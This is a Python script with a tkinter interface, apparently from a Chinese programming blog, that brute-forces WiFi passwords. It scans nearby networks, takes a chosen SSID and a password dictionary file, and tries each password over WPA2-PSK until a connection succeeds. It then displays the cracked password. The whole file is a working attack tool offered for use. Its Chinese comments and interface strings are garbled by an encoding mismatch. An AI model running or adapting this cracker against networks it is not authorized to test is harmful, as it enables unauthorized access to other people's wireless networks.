#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf-8 -*-
# Date: 2019/01/10
# Created by ����
# Description Wifi���ƹ���(ͼ�ν����)
# ���� https://blog.csdn.net/l1028386804
from tkinter import *
from tkinter import ttk  
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
 
class MY_GUI():
	def __init__(self,init_window_name):
		self.init_window_name = init_window_name
		
		#�����ļ�·��
		self.get_value = StringVar()
		
		#��ȡ�ƽ�wifi�˺�
		self.get_wifi_value = StringVar()
		
		#��ȡwifi����
		self.get_wifimm_value = StringVar()
		
		self.wifi = pywifi.PyWiFi()  #ץȡ�����ӿ�
		self.iface = self.wifi.interfaces()[0] #ץȡ��һ����������
		self.iface.disconnect()  #�������ӶϿ���������
		time.sleep(1)  #����1��
		#���������Ƿ����ڶϿ�״̬
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
	
	def __str__(self):
		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())
		
	#���ô���
	def set_init_window(self):
		self.init_window_name.title("WIFI�ƽ⹤��")
		self.init_window_name.geometry('+500+200')
		
		labelframe = LabelFrame(width=400, height=200,text="����")
		labelframe.grid(column=0, row=0, padx=10, pady=10)
		
		self.search = Button(labelframe,text="��������WiFi",command=self.scans_wifi_list).grid(column=0,row=0)
		
		self.pojie = Button(labelframe,text="��ʼ�ƽ�",command=self.readPassWord).grid(column=1,row=0)
		
		self.label = Label(labelframe,text="Ŀ¼·����").grid(column=0,row=1)
		
		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)
		
		self.file = Button(labelframe,text="��������ļ�Ŀ¼",command=self.add_mm_file).grid(column=2,row=1)
		
		self.wifi_text = Label(labelframe,text="WiFi�˺ţ�").grid(column=0,row=2)
		
		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)
		
		self.wifi_mm_text = Label(labelframe,text="WiFi���룺").grid(column=2,row=2)
		
		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)
		
		self.wifi_labelframe = LabelFrame(text="wifi�б�")
		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)
		
		
		# �������νṹ�������
		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show="headings",columns=("a", "b", "c", "d"))		
		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)       
		self.wifi_tree.configure(yscrollcommand=self.vbar.set)
		
		# ���ı���
		self.wifi_tree.column("a", width=50, anchor="center")
		self.wifi_tree.column("b", width=100, anchor="center")
		self.wifi_tree.column("c", width=100, anchor="center")
		self.wifi_tree.column("d", width=100, anchor="center")
         
		self.wifi_tree.heading("a", text="WiFiID")
		self.wifi_tree.heading("b", text="SSID")
		self.wifi_tree.heading("c", text="BSSID")
		self.wifi_tree.heading("d", text="signal")
        
		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
		self.wifi_tree.bind("<Double-1>",self.onDBClick)
		self.vbar.grid(row=4,column=1,sticky=NS)
		
	#����wifi
	#cmd /k C:\Python27\python.exe "$(FULL_CURRENT_PATH)" & PAUSE & EXIT
	def scans_wifi_list(self):  # ɨ����Χwifi�б�
		#��ʼɨ��
		print("^_^ ��ʼɨ�踽��wifi...")
		self.iface.scan()
		time.sleep(15)
		#����������ȡɨ����
		scanres = self.iface.scan_results()
		#ͳ�Ƹ��������ֵ��ȵ�����
		nums = len(scanres)
		print("����: %s"%(nums))
		#print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
		# ʵ������
		self.show_scans_wifi_list(scanres)
		return scanres
	
	#��ʾwifi�б�
	def show_scans_wifi_list(self,scans_res):
		for index,wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
			self.wifi_tree.insert("",'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
			#print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
	
	#��������ļ�Ŀ¼
	def add_mm_file(self):
		self.filename = tkinter.filedialog.askopenfilename()
		self.get_value.set(self.filename)
	
	#Treeview���¼�
	def onDBClick(self,event):
		self.sels= event.widget.selection()
		self.get_wifi_value.set(self.wifi_tree.item(self.sels,"values")[1])
		#print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])
	
	#��ȡ�����ֵ䣬����ƥ��
	def readPassWord(self):
		self.getFilePath = self.get_value.get()
		#print("�ļ�·����%s\n" %(self.getFilePath))
		self.get_wifissid = self.get_wifi_value.get()
		#print("ssid��%s\n" %(self.get_wifissid))
		self.pwdfilehander=open(self.getFilePath,"r",errors="ignore")
		while True:
				try:
					self.pwdStr =self.pwdfilehander.readline()
					#print("����: %s " %(self.pwdStr))
					if not self.pwdStr:
						break
					self.bool1=self.connect(self.pwdStr,self.get_wifissid)
					#print("����ֵ��%s\n" %(self.bool1) )
					if self.bool1:
						# print("������ȷ��"+pwdStr
						# res = "����:%s ��ȷ \n"%self.pwdStr;
						self.res = "===��ȷ===  wifi��:%s  ƥ�����룺%s "%(self.get_wifissid,self.pwdStr)
						self.get_wifimm_value.set(self.pwdStr)
						tkinter.messagebox.showinfo('��ʾ', '�ƽ�ɹ�������')
						print(self.res)
						break
					else:
						# print("����:"+self.pwdStr+"����")
						self.res = "---����--- wifi��:%sƥ�����룺%s"%(self.get_wifissid,self.pwdStr)
						print(self.res)
					sleep(3)
				except:
					continue
	
	#��wifi���������ƥ��
	def connect(self,pwd_Str,wifi_ssid):
		#����wifi�����ļ�
		self.profile = pywifi.Profile()
		self.profile.ssid =wifi_ssid #wifi����
		self.profile.auth = const.AUTH_ALG_OPEN  #�����Ŀ���
		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi�����㷨
		self.profile.cipher = const.CIPHER_TYPE_CCMP    #���ܵ�Ԫ
		self.profile.key = pwd_Str #����
		self.iface.remove_all_network_profiles() #ɾ�����е�wifi�ļ�
		self.tmp_profile = self.iface.add_network_profile(self.profile)#�趨�µ������ļ�
		self.iface.connect(self.tmp_profile)#����
		time.sleep(5)
		if self.iface.status() == const.IFACE_CONNECTED:  #�ж��Ƿ�������
			isOK=True   
		else:
			isOK=False
		self.iface.disconnect() #�Ͽ�
		time.sleep(1)
		#���Ͽ�״̬
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
		return isOK
		
def gui_start():
	init_window = Tk()
	ui = MY_GUI(init_window)
	print(ui)
	ui.set_init_window()
	#ui.scans_wifi_list()
	
	init_window.mainloop()
	
gui_start()
